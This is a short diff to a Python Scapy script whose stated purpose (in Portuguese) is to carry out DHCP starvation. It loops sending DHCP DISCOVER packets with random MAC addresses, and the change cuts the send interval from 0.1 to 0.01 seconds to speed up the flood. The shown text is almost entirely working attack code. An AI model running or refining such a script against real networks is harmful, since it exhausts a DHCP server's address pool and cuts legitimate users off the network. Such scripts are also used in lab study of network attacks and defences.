@@ -12,7 +12,7 @@ def dhcp_starvation(iface):
                     / BOOTP(op=1, chaddr=RandMAC()) \
                     / DHCP(options=[('message-type', 'discover'), ('end')])
 
-        sendp(DHCP_DISCOVER, iface=iface,loop=1,inter=0.1, verbose=1)
+        sendp(DHCP_DISCOVER, iface=iface,loop=1,inter=0.01, verbose=1)
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description='Script para executar DHCP Starvation.')
